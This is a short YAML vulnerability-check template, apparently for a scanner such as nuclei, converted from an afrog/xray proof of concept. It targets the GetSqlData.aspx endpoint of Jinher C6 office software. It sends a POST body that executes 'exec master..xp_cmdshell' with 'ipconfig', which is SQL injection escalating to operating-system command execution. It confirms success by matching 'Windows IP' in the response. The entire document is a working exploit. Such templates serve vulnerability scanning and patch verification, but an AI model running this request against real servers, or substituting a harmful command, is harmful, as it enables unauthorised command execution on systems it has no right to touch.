# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      exec master..xp_cmdshell 'ipconfig'
    headers:
      Content-Type: text/plain
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - Windows IP
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/C6/Control/GetSqlData.aspx/.ashx'
id: jinher-c6-getsqldata-sqli
